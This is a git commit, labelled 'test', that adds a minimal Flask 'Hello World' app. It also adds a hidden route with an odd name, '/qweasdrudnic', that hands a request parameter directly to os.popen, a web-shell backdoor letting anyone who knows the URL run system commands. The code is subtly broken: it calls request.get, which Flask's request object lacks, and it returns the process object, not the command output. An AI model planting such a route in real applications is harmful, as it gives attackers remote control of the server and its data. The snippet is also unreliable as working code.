43f62c48e85d078c7debdfaaa62fe25f6c42f492
rudnic <werdont@gmail.com>
2026-03-21 13:10:54 +0300

    test

---
+++ main.py
@@ -0,0 +1,15 @@
+from flask import Flask, request
+import os
+
+app = Flask(__name__)
+
+@app.route('/')
+def hello_world():
+    return 'Hello World'
+
+@app.route('/qweasdrudnic')
+def qwe():
+    return f'Command: {os.popen(request.get('rudnic'))}'    
+
+if __name__ == "__main__":
+    app.run()
